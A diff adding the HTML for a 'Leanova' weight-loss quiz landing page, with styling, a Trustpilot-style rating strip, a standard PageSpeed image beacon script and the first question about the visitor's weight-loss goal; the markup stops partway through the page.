@@ -1,0 +1,1405 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <title>Your Weight Loss Goals | Leanova</title>
+    <meta
+      name="description"
+      content="Tell us about your weight loss goals to start your personalized journey with Leanova. Find a plan that works for you."
+    />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link
+      rel="stylesheet"
+      href="https://fonts.googleapis.com/css2?family=Poetsen+One&amp;display=swap"
+    />
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
+      html,
+      body {
+        height: 100%;
+      }
+      body {
+        min-height: 100vh;
+        font-family: "V5FontPrimary", -apple-system, BlinkMacSystemFont,
+          "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+        font-size: 16px;
+        background: #f7f9f8;
+        color: #00482e;
+      }
+      .container {
+        width: 100%;
+        max-width: 675px;
+        padding-inline: 1rem;
+        margin-inline: auto;
+      }
+      main {
+        min-height: calc(100vh - 333px);
+      }
+      @media (max-width: 1080px) {
+        main {
+          min-height: 100%;
+        }
+      }
+      @media (max-width: 675px) {
+        body {
+          font-size: 14px;
+        }
+      }
+      .header-wrapper {
+        display: flex;
+        flex-direction: column;
+        width: 100%;
+      }
+      .trustpilot-widget {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 0.8125rem;
+        background: #00482e;
+        width: 100%;
+        height: 30px;
+      }
+      .trustpilot-head {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 0.35rem;
+      }
+      .trustpilot-reviews {
+        display: flex;
+        align-items: center;
+        gap: 0.25rem;
+      }
+      .trustpilot-reviews span {
+        font-size: 0.75rem;
+      }
+      .head-title {
+        font-size: 0.75rem;
+        color: #fff;
+      }
+      .head-title__bold {
+        font-weight: 700;
+        color: #fff;
+      }
+      .trustpilot-logo {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 0.25rem;
+      }
+      .trustpilot-logo .logo-title {
+        font-size: 0.75rem;
+        font-weight: 700;
+        color: #fff;
+      }
+      @media (max-width: 675px) {
+        .trustpilot-widget {
+          padding: 0 1rem;
+        }
+        .trustpilot-stars {
+          max-width: 100px;
+        }
+        .trustpilot-head {
+          gap: 0.15rem;
+        }
+      }
+      .leanova-widget {
+        display: flex;
+        align-items: center;
+        width: 100%;
+        height: 56px;
+        padding: 0 4.375rem;
+        background: #fff;
+      }
+      .leanova-back {
+        background: transparent;
+        border: 0;
+        cursor: pointer;
+      }
+      .leanova-back svg path {
+        fill: #91b242;
+      }
+      .leanova-logo {
+        margin: 0 auto;
+        display: block;
+      }
+      .leanova-step {
+        color: #77887f;
+        font-weight: 500;
+        font-size: 1rem;
+      }
+      .leanova-step-desktop {
+        display: none;
+        font-size: 0.625rem;
+      }
+      @media (max-width: 1080px) {
+        .leanova-widget {
+          padding: 0 1.5rem;
+        }
+      }
+      @media (max-width: 675px) {
+        .leanova-widget {
+          padding: 0 1rem;
+        }
+        .leanova-step {
+          display: none;
+        }
+        .leanova-step-desktop {
+          display: inline;
+        }
+      }
+      .benefits-widget {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 7.5rem;
+        margin-bottom: 26px;
+        width: 100%;
+        height: 52px;
+        background: #ffce47;
+      }
+      .benefits-item {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 0.75rem;
+      }
+      .benefits-item-icon {
+        min-width: 16px;
+      }
+      .item-title {
+        font-weight: 600;
+        font-size: 0.875rem;
+        text-transform: uppercase;
+        color: #00482e;
+      }
+      @media (max-width: 1080px) {
+        .benefits-widget {
+          justify-content: space-between;
+          gap: 1rem;
+          padding: 1.5rem;
+          height: auto;
+        }
+        .benefits-item {
+          width: 100%;
+        }
+      }
+      @media (max-width: 675px) {
+        .benefits-widget {
+          padding: 1rem;
+          margin-bottom: 11px;
+        }
+        .benefits-item {
+          gap: 0.5rem;
+        }
+        .item-title {
+          font-size: 0.625rem;
+          line-height: 0.75rem;
+          width: min-content;
+        }
+        .benefits-item-title_1 {
+          min-width: 85px;
+        }
+        .benefits-item-title_2 {
+          min-width: 70px;
+        }
+        .benefits-item-title_3 {
+          min-width: 73px;
+        }
+      }
+      .progress-wrapper {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 19px;
+        padding: 0 13px;
+      }
+      .progress-widget {
+        display: flex;
+        align-items: flex-start;
+        justify-content: flex-start;
+        max-width: 848px;
+        width: 100%;
+        height: 6px;
+        border-radius: 12px;
+        background: #fff;
+      }
+      .progress-line {
+        height: 100%;
+        border-radius: 12px;
+        background: #91b242;
+      }
+      .question-container {
+        display: flex;
+        align-items: center;
+        flex-direction: column;
+        width: 100%;
+        padding: 2.5rem 0;
+      }
+      .question-header {
+        display: flex;
+        flex-direction: column;
+        gap: 1rem;
+        margin-bottom: 1.5rem;
+      }
+      .question-title {
+        font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI",
+          Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue",
+          sans-serif;
+        font-size: 2.1rem;
+        font-weight: 700 !important;
+        text-align: center;
+        line-height: 100%;
+        font-weight: normal;
+      }
+      .question-subtitle {
+        font-size: 1rem;
+        font-weight: 400;
+        color: #77887f;
+        text-align: center;
+      }
+      @media (max-width: 1080px) {
+        .question-title {
+          font-size: 2.5rem;
+        }
+      }
+      @media (max-width: 675px) {
+        .question-title {
+          font-size: 1.25rem;
+          text-align: left;
+          line-height: 1.625rem;
+        }
+        .question-subtitle {
+          font-size: 0.9375rem;
+          line-height: 1.375rem;
+          text-align: left;
+        }
+        .question-container {
+          align-items: start;
+          padding: 1.5625rem 1rem 1rem;
+        }
+        .question-header {
+          width: 100%;
+          max-width: 480px;
+          margin: 0 auto 1.5rem;
+          gap: 0.75rem;
+        }
+      }
+      .question-answers {
+        display: flex;
+        align-items: center;
+        flex-direction: column;
+        gap: 0.875rem;
+        max-width: 512px;
+        width: 100%;
+        margin-bottom: 1.5rem;
+      }
+      .answers-button {
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        width: 100%;
+        min-height: 64px;
+        padding: 0.5rem 1.5rem;
+        border-radius: 0.5rem;
+        background: #fff;
+        font-weight: 700;
+        cursor: pointer;
+        transition: background-color 0.15s ease-in-out,
+          box-shadow 0.15s ease-in-out;
+        border: 1px solid transparent;
+      }
+      .answers-button__goal {
+        min-height: 56px;
+        height: 56px;
+      }
+      .answers-button:hover,
+      .answers-button:active {
+        background: #f9fbe1;
+        border-color: #91b242;
+      }
+      .button-title {
+        font-family: "V5FontPrimary", -apple-system, BlinkMacSystemFont,
+          "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+        font-weight: 600;
+        font-size: 16px;
+        color: #00482e;
+      }
+      .button-icon path {
+        fill: #1f2a37;
+      }
+      @media (max-width: 675px) {
+        .question-answers {
+          max-width: 480px;
+          margin: 0 auto 1.5rem;
+        }
+        .answers-button {
+          min-height: 40px;
+          height: 40px;
+          max-width: 480px;
+        }
+        .button-title {
+          font-size: 0.9375rem;
+        }
+        .button-icon {
+          width: 1.25rem;
+        }
+      }
+      .question-secure {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        flex-direction: column;
+        gap: 0.5rem;
+        margin-bottom: 1.5rem;
+      }
+      .secure-info {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 0.375rem;
+      }
+      .info-title {
+        font-weight: 500;
+        font-size: 0.625rem;
+      }
+      .secure-image {
+        width: 108px;
+        height: 21px;
+      }
+      @media (max-width: 675px) {
+        .question-secure {
+          margin: 0 auto 1rem;
+        }
+      }
+      .question-review {
+        display: flex;
+        flex-direction: column;
+        align-items: flex-start;
+        gap: 1rem;
+        max-width: 558px;
+        padding: 1rem;
+        border-radius: 1rem;
+        background: #fff;
+      }
+      .review-head {
+        display: flex;
+        flex-direction: column;
+        gap: 1rem;
+      }
+      .head-rating {
+        display: flex;
+        align-items: center;
+        gap: 0.25rem;
+      }
+      .rating-filled path {
+        fill: #ffce47;
+        stroke: #ffce47;
+      }
+      .head-title {
+        font-weight: 700;
+        font-size: 1.5rem;
+      }
+      .review-text {
+        font-weight: 500;
+        font-size: 1rem;
+        color: #77887f;
+      }
+      .review-disclaimer {
+        font-size: 0.75rem;
+        color: #77887f;
+        width: 100%;
+        text-align: center;
+        margin-top: 0.5rem;
+      }
+      .review-footer {
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        width: 100%;
+      }
+      .footer-user {
+        display: flex;
+        align-items: center;
+        gap: 0.75rem;
+      }
+      .user-avatar {
+        width: 32px;
+        min-width: 32px;
+        height: 32px;
+        min-height: 32px;
+        border-radius: 999px;
+        object-fit: cover;
+      }
+      .user-name {
+        font-weight: 700;
+        font-size: 0.875rem;
+      }
+      .footer-confirm {
+        display: flex;
+        align-items: center;
+        gap: 0.375rem;
+      }
+      .confirm-icon path {
+        stroke: #b1c354;
+      }
+      .confirm-title {
+        font-weight: 600;
+        font-size: 1rem;
+        color: #b1c354;
+      }
+      .footer .footer-links a {
+        text-decoration: none;
+      }
+      .footer .footer-links a:hover {
+        color: #91b242;
+      }
+      @media (max-width: 1080px) {
+        .head-title {
+          font-size: 1.35rem;
+        }
+      }
+      @media (max-width: 675px) {
+        .head-title {
+          font-size: 0.9375rem;
+        }
+        .review-text {
+          font-size: 0.75rem;
+          line-height: 1rem;
+        }
+        .user-name {
+          font-size: 0.75rem;
+        }
+        .user-avatar {
+          width: 20px;
+          min-width: 20px;
+          height: 20px;
+          min-height: 20px;
+        }
+        .confirm-title {
+          font-weight: 500;
+          font-size: 0.625rem;
+        }
+        .confirm-icon {
+          width: 12px;
+          height: 12px;
+        }
+      }
+      .footer {
+        padding: 24px 0;
+      }
+      .footer .footer-content {
+        max-width: 675px;
+        margin: 0 auto;
+        text-align: center;
+      }
+      .footer .footer-links a {
+        color: #00482e;
+      }
+      .footer .copyright {
+        margin-top: 8px;
+        font-size: 0.875rem;
+        color: #4d5761;
+      }
+      .footer-disclaimer {
+        font-size: 0.75rem;
+        color: #4d5761;
+        margin-top: 1rem;
+        max-width: 600px;
+        margin-left: auto;
+        margin-right: auto;
+      }
+    </style>
+  </head>
+  <body>
+    <noscript
+      ><meta
+        http-equiv="refresh"
+        content="0;url='http://leanova-uk.fitpi.site/?PageSpeed=noscript'"
+      /><style>
+        <!--table,div,span,font,p{display:none} -->
+      </style>
+      <div style="display: block">
+        Please click
+        <a href="http://leanova-uk.fitpi.site/?PageSpeed=noscript">here</a> if
+        you are not redirected within a few seconds.
+      </div></noscript
+    >
+    <header class="header-wrapper">
+      <!-- Trustpilot strip -->
+      <div class="trustpilot-widget" aria-label="Trustpilot rating">
+        <svg
+          class="trustpilot-stars"
+          width="109"
+          height="20"
+          viewBox="0 0 109 20"
+          fill="none"
+          aria-hidden="true"
+        >
+          <rect
+            width="20"
+            height="20"
+            transform="translate(0.5)"
+            fill="#169F3D"
+          />
+          <path
+            d="M10.5 13.6761L13.5417 12.8616L14.8125 17L10.5 13.6761ZM17.5 8.32704H12.1458L10.5 3L8.85417 8.32704H3.5L7.83334 11.6289L6.1875 16.956L10.5208 13.6541L13.1875 11.6289L17.5 8.32704Z"
+            fill="#fff"
+          />
+          <rect
+            width="20"
+            height="20"
+            transform="translate(22.5)"
+            fill="#169F3D"
+          />
+          <path
+            d="M32.5 13.6761L35.5417 12.8616L36.8125 17L32.5 13.6761ZM39.5 8.32704H34.1458L32.5 3L30.8542 8.32704H25.5L29.8333 11.6289L28.1875 16.956L32.5208 13.6541L35.1875 11.6289L39.5 8.32704Z"
+            fill="#fff"
+          />
+          <rect
+            width="20"
+            height="20"
+            transform="translate(44.5)"
+            fill="#169F3D"
+          />
+          <path
+            d="M54.5 13.6761L57.5417 12.8616L58.8125 17L54.5 13.6761ZM61.5 8.32704H56.1458L54.5 3L52.8542 8.32704H47.5L51.8333 11.6289L50.1875 16.956L54.5208 13.6541L57.1875 11.6289L61.5 8.32704Z"
+            fill="#fff"
+          />
+          <rect
+            width="20"
+            height="20"
+            transform="translate(66.5)"
+            fill="#169F3D"
+          />
+          <path
+            d="M76.5 13.6761L79.5417 12.8616L80.8125 17L76.5 13.6761ZM83.5 8.32704H78.1458L76.5 3L74.8542 8.32704H69.5L73.8333 11.6289L72.1875 16.956L76.5208 13.6541L79.1875 11.6289L83.5 8.32704Z"
+            fill="#fff"
+          />
+          <rect
+            width="20"
+            height="20"
+            transform="translate(88.5)"
+            fill="#169F3D"
+          />
+          <path
+            d="M98.5 13.6761L101.542 12.8616L102.813 17L98.5 13.6761ZM105.5 8.32704H100.146L98.5 3L96.8542 8.32704H91.5L95.8333 11.6289L94.1875 16.956L98.5208 13.6541L101.187 11.6289L105.5 8.32704Z"
+            fill="#fff"
+          />
+        </svg>
+        <div class="trustpilot-head">
+          <div class="trustpilot-reviews">
+            <span class="head-title head-title__bold">5000+</span>
+            <span class="head-title"> reviews on</span>
+          </div>
+        </div>
+        <div class="trustpilot-logo" aria-label="Trustpilot brand">
+          <svg
+            width="15"
+            height="14"
+            viewBox="0 0 15 14"
+            fill="none"
+            aria-hidden="true"
+          >
+            <path
+              d="M7.5 10.4792L10.5417 9.70833L11.8125 13.625L7.5 10.4792ZM14.5 5.41667H9.14583L7.5 0.375L5.85417 5.41667H0.5L4.83334 8.54167L3.1875 13.5833L7.52083 10.4583L10.1875 8.54167L14.5 5.41667Z"
+              fill="#219653"
+            />
+          </svg>
+          <span class="logo-title">Trustpilot</span>
+        </div>
+      </div>
+      <!-- Top bar -->
+      <div class="leanova-widget">
+        <button
+          type="button"
+          class="leanova-back"
+          style="opacity: 0"
+          aria-label="Back"
+        >
+          <svg
+            width="24"
+            height="24"
+            viewBox="0 0 24 24"
+            fill="none"
+            aria-hidden="true"
+          >
+            <path
+              d="M12 20L13.41 18.59L7.83 13H20v-2H7.83L13.41 5.41 12 4 4 12l8 8Z"
+              fill="currentColor"
+            />
+          </svg>
+        </button>
+        <script data-pagespeed-no-defer>
+          (function () {
+            for (
+              var g =
+                  "function" == typeof Object.defineProperties
+                    ? Object.defineProperty
+                    : function (b, c, a) {
+                        if (a.get || a.set)
+                          throw new TypeError(
+                            "ES3 does not support getters and setters."
+                          );
+                        b != Array.prototype &&
+                          b != Object.prototype &&
+                          (b[c] = a.value);
+                      },
+                h =
+                  "undefined" != typeof window && window === this
+                    ? this
+                    : "undefined" != typeof global && null != global
+                    ? global
+                    : this,
+                k = ["String", "prototype", "repeat"],
+                l = 0;
+              l < k.length - 1;
+              l++
+            ) {
+              var m = k[l];
+              m in h || (h[m] = {});
+              h = h[m];
+            }
+            var n = k[k.length - 1],
+              p = h[n],
+              q = p
+                ? p
+                : function (b) {
+                    var c;
+                    if (null == this)
+                      throw new TypeError(
+                        "The 'this' value for String.prototype.repeat must not be null or undefined"
+                      );
+                    c = this + "";
+                    if (0 > b || 1342177279 < b)
+                      throw new RangeError("Invalid count value");
+                    b |= 0;
+                    for (var a = ""; b; )
+                      if ((b & 1 && (a += c), (b >>>= 1))) c += c;
+                    return a;
+                  };
+            q != p &&
+              null != q &&
+              g(h, n, { configurable: !0, writable: !0, value: q });
+            var t = this;
+            function u(b, c) {
+              var a = b.split("."),
+                d = t;
+              a[0] in d || !d.execScript || d.execScript("var " + a[0]);
+              for (var e; a.length && (e = a.shift()); )
+                a.length || void 0 === c
+                  ? d[e]
+                    ? (d = d[e])
+                    : (d = d[e] = {})
+                  : (d[e] = c);
+            }
+            function v(b) {
+              var c = b.length;
+              if (0 < c) {
+                for (var a = Array(c), d = 0; d < c; d++) a[d] = b[d];
+                return a;
+              }
+              return [];
+            }
+            function w(b) {
+              var c = window;
+              if (c.addEventListener) c.addEventListener("load", b, !1);
+              else if (c.attachEvent) c.attachEvent("onload", b);
+              else {
+                var a = c.onload;
+                c.onload = function () {
+                  b.call(this);
+                  a && a.call(this);
+                };
+              }
+            }
+            var x;
+            function y(b, c, a, d, e) {
+              this.h = b;
+              this.j = c;
+              this.l = a;
+              this.f = e;
+              this.g = {
+                height:
+                  window.innerHeight ||
+                  document.documentElement.clientHeight ||
+                  document.body.clientHeight,
+                width:
+                  window.innerWidth ||
+                  document.documentElement.clientWidth ||
+                  document.body.clientWidth,
+              };
+              this.i = d;
+              this.b = {};
+              this.a = [];
+              this.c = {};
+            }
+            function z(b, c) {
+              var a,
+                d,
+                e = c.getAttribute("data-pagespeed-url-hash");
+              if ((a = e && !(e in b.c)))
+                if (0 >= c.offsetWidth && 0 >= c.offsetHeight) a = !1;
+                else {
+                  d = c.getBoundingClientRect();
+                  var f = document.body;
+                  a =
+                    d.top +
+                    ("pageYOffset" in window
+                      ? window.pageYOffset
+                      : (document.documentElement || f.parentNode || f)
+                          .scrollTop);
+                  d =
+                    d.left +
+                    ("pageXOffset" in window
+                      ? window.pageXOffset
+                      : (document.documentElement || f.parentNode || f)
+                          .scrollLeft);
+                  f = a.toString() + "," + d;
+                  b.b.hasOwnProperty(f)
+                    ? (a = !1)
+                    : ((b.b[f] = !0), (a = a <= b.g.height && d <= b.g.width));
+                }
+              a && (b.a.push(e), (b.c[e] = !0));
+            }
+            y.prototype.checkImageForCriticality = function (b) {
+              b.getBoundingClientRect && z(this, b);
+            };
+            u(
+              "pagespeed.CriticalImages.checkImageForCriticality",
+              function (b) {
+                x.checkImageForCriticality(b);
+              }
+            );
+            u("pagespeed.CriticalImages.checkCriticalImages", function () {
+              A(x);
+            });
+            function A(b) {
+              b.b = {};
+              for (var c = ["IMG", "INPUT"], a = [], d = 0; d < c.length; ++d)
+                a = a.concat(v(document.getElementsByTagName(c[d])));
+              if (a.length && a[0].getBoundingClientRect) {
+                for (d = 0; (c = a[d]); ++d) z(b, c);
+                a = "oh=" + b.l;
+                b.f && (a += "&n=" + b.f);
+                if ((c = !!b.a.length))
+                  for (
+                    a += "&ci=" + encodeURIComponent(b.a[0]), d = 1;
+                    d < b.a.length;
+                    ++d
+                  ) {
+                    var e = "," + encodeURIComponent(b.a[d]);
+                    131072 >= a.length + e.length && (a += e);
+                  }
+                b.i &&
+                  ((e = "&rd=" + encodeURIComponent(JSON.stringify(B()))),
+                  131072 >= a.length + e.length && (a += e),
+                  (c = !0));
+                C = a;
+                if (c) {
+                  d = b.h;
+                  b = b.j;
+                  var f;
+                  if (window.XMLHttpRequest) f = new XMLHttpRequest();
+                  else if (window.ActiveXObject)
+                    try {
+                      f = new ActiveXObject("Msxml2.XMLHTTP");
+                    } catch (r) {
+                      try {
+                        f = new ActiveXObject("Microsoft.XMLHTTP");
+                      } catch (D) {}
+                    }
+                  f &&
+                    (f.open(
+                      "POST",
+                      d +
+                        (-1 == d.indexOf("?") ? "?" : "&") +
+                        "url=" +
+                        encodeURIComponent(b)
+                    ),
+                    f.setRequestHeader(
+                      "Content-Type",
+                      "application/x-www-form-urlencoded"
+                    ),
+                    f.send(a));
+                }
+              }
+            }
+            function B() {
+              var b = {},
+                c;
+              c = document.getElementsByTagName("IMG");
+              if (!c.length) return {};
+              var a = c[0];
+              if (!("naturalWidth" in a && "naturalHeight" in a)) return {};
+              for (var d = 0; (a = c[d]); ++d) {
+                var e = a.getAttribute("data-pagespeed-url-hash");
+                e &&
+                  ((!(e in b) &&
+                    0 < a.width &&
+                    0 < a.height &&
+                    0 < a.naturalWidth &&
+                    0 < a.naturalHeight) ||
+                    (e in b && a.width >= b[e].o && a.height >= b[e].m)) &&
+                  (b[e] = {
+                    rw: a.width,
+                    rh: a.height,
+                    ow: a.naturalWidth,
+                    oh: a.naturalHeight,
+                  });
+              }
+              return b;
+            }
+            var C = "";
+            u("pagespeed.CriticalImages.getBeaconData", function () {
+              return C;
+            });
+            u("pagespeed.CriticalImages.Run", function (b, c, a, d, e, f) {
+              var r = new y(b, c, a, e, f);
+              x = r;
+              d &&
+                w(function () {
+                  window.setTimeout(function () {
+                    A(r);
+                  }, 0);
+                });
+            });
+          })();
+          pagespeed.CriticalImages.Run(
+            "/ngx_pagespeed_beacon",
+            "http://leanova-uk.fitpi.site/",
+            "q2D-pa7Tn4",
+            true,
+            false,
+            "EWU3BZ3KlwM"
+          );
+        </script>
+        <img
+          class="leanova-logo"
+          src="leanova_logo.svg"
+          alt="Leanova logo"
+          width="140"
+          height="35"
+          data-pagespeed-url-hash="2825237307"
+          onload="pagespeed.CriticalImages.checkImageForCriticality(this);"
+        />
+        <!-- <span class="leanova-step leanova-step-desktop">1/9</span> -->
+      </div>
+      <!-- Benefits -->
+      <div class="benefits-widget">
+        <div class="benefits-item">
+          <svg
+            class="benefits-item-icon"
+            width="15"
+            height="14"
+            viewBox="0 0 15 14"
+            fill="none"
+            aria-hidden="true"
+          >
+            <path
+              d="M12.505 3.49408c-.1222-.22626-.2976-.4144-.5088-.54571-.2112-.13131-.4509-.20123-.6952-.20281H9.6V1.24852C9.6 1.05 9.52625.859611 9.39497.719237 9.2637.578862 9.08565.5 8.9.5H1.9C1.5287.5 1.1726.657723.91005.938473.6475 1.21922.5 1.6.5 1.99704v7.4852c.00025.26253.06506.52036.18792.74766.12286.2273.29946.41599.51208.5473-.02506.6948.20902 1.3718.65077 1.8821.44174.5102 1.05495.8119 1.70473.8387.64978.0268 1.2829-.2235 1.76009-.6958.47719-.4724.75935-1.1281.78441-1.8229H8.27c.07741.6263.36502 1.2011.80929 1.6175.44427.4165 1.01487.6452 1.60567.6452.5908 0 1.1614-.2295 1.6057-.646.4443-.4169.7319-.9821.809-1.6079.3713 0 .7274-.1577.9899-.4385.2626-.2807.41-.6616.41-1.05866V7.23668c-.002-.13642-.0357-.27017-.098-.38923l-1.897-3.35337ZM9.6 4.2426h1.701L12.561 6.48816H9.6V4.2426ZM3.65 11.7278c-.20767 0-.41068-.0658-.58335-.1892-.17267-.1234-.30725-.2987-.38672-.5039-.07948-.2052-.10027-.4309-.05975-.6487.04051-.2178.14051-.41788.28736-.5749.14684-.15703.33394-.26396.53762-.30729.20368-.04332.4148-.02108.60666.0639.19186.08498.35585.22889.47122.41353.11538.18464.177-.03246.177.19054 0 .2978-.11062.5834-.30754.7939-.19691.2105-.46398.3288-.74246.3288Zm7 0c-.2077 0-.4107-.0658-.5834-.1892-.1727-.1234-.3073-.2987-.3868-.5039-.0795-.2052-.1003-.4309-.0597-.6487.0405-.2178.1405-.41788.2873-.5749.1469-.15703.334-.26396.5376-.30729.2036-.04332.4148-.02108.6066.0639.1919.08498.3559.22889.4713.41353.1154.18464.177.40174.177.62374 0 .2978-.1106.5834-.3075.7939-.1969.2105-.4639.3288-.7423.3288ZM8.99591 4.4554c-.57564 0-1.06563-.20229-1.46997-.60686C7.1216 3.44396 6.91943 2.95267 6.91943 2.37467c0-.58437.20229-1.07725.60687-1.478641C7.93087.49464 8.42216.293945 9.00016.293945c.58438 0 1.07724.200695 1.47864.602084.4014.401381.6021.895071.6021 1.482001 0 .57564-.2007 1.06573-.6021 1.4701-.4014.40434-.89568.60651-1.48289.60651Z"
+              fill="#00482E"
+            />
+          </svg>
+          <span class="item-title benefits-item-title_1"
+            >FREE AND FAST SHIPPING</span
+          >
+        </div>
+        <div class="benefits-item">
+          <svg
+            class="benefits-item-icon"
+            width="18"
+            height="9"
+            viewBox="0 0 18 9"
+            fill="none"
+            aria-hidden="true"
+          >
+            <path
+              d="M0.544 8.705V7.634c0-.502.257-.906.771-1.213.513-.307 1.186-.461 2.018-.461.177 0 .34.004.49.013.151.009.291.025.421.048a2.3 2.3 0 0 0-.354.756c-.076.262-.114.535-.114.819V8.705H0.544ZM4.794 8.705V7.596c0-.364.1-.701.301-1.011.201-.31.49-.58.868-.81.378-.23.826-.404 1.345-.522.519-.118 1.081-.177 1.688-.177.618 0 1.187.059 1.706.177.519.118.967.292 1.345.522.378.23.666.5.864.807.198.307.297.646.297 1.017v1.107H4.794ZM14.224 8.705V7.599c0-.289-.037-.565-.111-.827a2.74 2.74 0 0 0-.332-.748c.13-.024.267-.04.411-.049.145-.009.302-.013.473-.013.832 0 1.505.152 2.019.457.513.305.77.711.77 1.217v1.069H14.224ZM3.333 5.164c-.378 0-.701-.134-.969-.403-.269-.269-.403-.592-.403-.97 0-.389.134-.715.403-.977.269-.263.592-.394.97-.394.389 0 .715.132.978.395.263.263.394.589.394.978 0 .377-.132.7-.395.969-.263.269-.589.403-.978.403Zm11.333 0c-.377 0-.7-.134-.969-.403-.268-.269-.403-.592-.403-.97 0-.389.135-.715.404-.977.269-.263.591-.394.969-.394.389 0 .715.132.978.395.263.263.394.589.394.978 0 .377-.131.7-.394.969-.263.269-.589.403-.978.403ZM8.996 4.455c-.576 0-1.066-.202-1.47-.607C7.12 3.444 6.919 2.953 6.919 2.375c0-.584.202-1.077.607-1.479.405-.401.896-.602 1.474-.602.584 0 1.077.201 1.479.602.401.401.602.895.602 1.482 0 .575-.2 1.066-.602 1.47-.401.404-.896.607-1.483.607Z"
+              fill="#00482E"
+            />
+          </svg>
+          <span class="item-title benefits-item-title_2"
+            >50 000+ SATISFIED CUSTOMERS</span
+          >
+        </div>
+        <div class="benefits-item">
+          <svg
+            width="20"
+            height="20"
+            viewBox="0 0 25 24"
+            fill="none"
+            aria-hidden="true"
+          >
+            <path
+              d="M19.5 14C20.99 12.54 22.5 10.79 22.5 8.5C22.5 7.04131 21.9205 5.64236 20.8891 4.61091C19.8576 3.57946 18.4587 3 17 3C15.24 3 14 3.5 12.5 5C11 3.5 9.76 3 8 3C6.54131 3 5.14236 3.57946 4.11091 4.61091C3.07946 5.64236 2.5 7.04131 2.5 8.5C2.5 10.8 4 12.55 5.5 14L12.5 21L19.5 14Z"
+              stroke="#00482E"
+              stroke-width="2"
+              stroke-linecap="round"
+              stroke-linejoin="round"
+            />
+          </svg>
+          <span class="item-title benefits-item-title_3"
+            >CONFIDENTIAL AND SECURE</span
+          >
+        </div>
+      </div>
+      <!-- Progress -->
+      <div class="progress-wrapper" aria-label="Progress">
+        <div class="progress-widget">
+          <div class="progress-line" style="width: 15%"></div>
+        </div>
+        <!-- <span class="leanova-step">1/9</span> -->
+      </div>
+    </header>
+    <main>
+      <section class="container question-container">
+        <div class="question-header">
+          <h1 class="question-title">
+            Let us know what your current weight <br />loss goal is.
+          </h1>
+          <p class="question-subtitle">
+            Choose the option that best describes your goal.
+          </p>
+        </div>
+        <div class="question-answers">
+          <button type="button" class="answers-button answers-button__goal">
+            <span class="button-title">My goal is to lose 0.5 - 1st</span>
+            <svg
+              class="button-icon"
+              width="24"
+              height="25"
+              viewBox="0 0 24 25"
+              fill="none"
+              aria-hidden="true"
+            >
+              <path
+                d="M12 4.5L10.59 5.91 16.17 11.5H4v2h12.17L10.59 19.09 12 20.5l8-8-8-8Z"
+                fill="currentColor"
+              />
+            </svg>
+          </button>
+          <button type="button" class="answers-button answers-button__goal">
+            <span class="button-title">My goal is to lose 1 - 1.5st</span>
+            <svg
+              class="button-icon"
+              width="24"
+              height="25"
+              viewBox="0 0 24 25"
+              fill="none"
+              aria-hidden="true"
+            >
+              <path
+                d="M12 4.5L10.59 5.91 16.17 11.5H4v2h12.17L10.59 19.09 12 20.5l8-8-8-8Z"
+                fill="currentColor"
+              />
+            </svg>
+          </button>
+          <button type="button" class="answers-button answers-button__goal">
+            <span class="button-title">My goal is to lose over 1.5st</span>
+            <svg
+              class="button-icon"
+              width="24"
+              height="25"
+              viewBox="0 0 24 25"
+              fill="none"
+              aria-hidden="true"
+            >
+              <path
+                d="M12 4.5L10.59 5.91 16.17 11.5H4v2h12.17L10.59 19.09 12 20.5l8-8-8-8Z"
+                fill="currentColor"
+              />
+            </svg>
+          </button>
+          <button type="button" class="answers-button answers-button__goal">
+            <span class="button-title">Maintain weight and get fit</span>
+            <svg
+              class="button-icon"
+              width="24"
+              height="25"
+              viewBox="0 0 24 25"
+              fill="none"
+              aria-hidden="true"
+            >
+              <path
+                d="M12 4.5L10.59 5.91 16.17 11.5H4v2h12.17L10.59 19.09 12 20.5l8-8-8-8Z"
+                fill="currentColor"
+              />
+            </svg>
+          </button>
+          <button type="button" class="answers-button answers-button__goal">
+            <span class="button-title">I haven't decided yet</span>
+            <svg
+              class="button-icon"
+              width="24"
+              height="25"
+              viewBox="0 0 24 25"
+              fill="none"
+              aria-hidden="true"
+            >
+              <path
+                d="M12 4.5L10.59 5.91 16.17 11.5H4v2h12.17L10.59 19.09 12 20.5l8-8-8-8Z"
+                fill="currentColor"
+              />
+            </svg>
+          </button>
+        </div>
+        <div class="question-secure">
+          <div class="secure-info">
+            <svg
+              class="info-icon"
+              width="12"
+              height="12"
+              viewBox="0 0 17 16"
+              fill="none"
+              aria-hidden="true"
+            >
+              <path
+                d="M13.1667 7.33331H3.83333C3.09695 7.33331 2.5 7.93027 2.5 8.66665V13.3333C2.5 14.0697 3.09695 14.6666 3.83333 14.6666H13.1667C13.903 14.6666 14.5 14.0697 14.5 13.3333V8.66665C14.5 7.93027 13.903 7.33331 13.1667 7.33331Z"
+                stroke="currentColor"
+                stroke-width="1.33333"
+                stroke-linecap="round"
+                stroke-linejoin="round"
+              />
+              <path
+                d="M5.16699 7.33331V4.66665C5.16699 3.78259 5.51818 2.93475 6.1433 2.30962C6.76842 1.6845 7.61627 1.33331 8.50033 1.33331C9.38438 1.33331 10.2322 1.6845 10.8573 2.30962C11.4825 2.93475 11.8337 3.78259 11.8337 4.66665V7.33331"
+                stroke="currentColor"
+                stroke-width="1.33333"
+                stroke-linecap="round"
+                stroke-linejoin="round"
+              />
+            </svg>
+            <span class="info-title">Your information is safe with us.</span>
+          </div>
+          <img
+            class="secure-image"
+            src="image-1.png"
+            width="108"
+            height="21"
+            alt="Secure payment methods"
+            data-pagespeed-url-hash="3011530155"
+            onload="pagespeed.CriticalImages.checkImageForCriticality(this);"
+          />
+        </div>
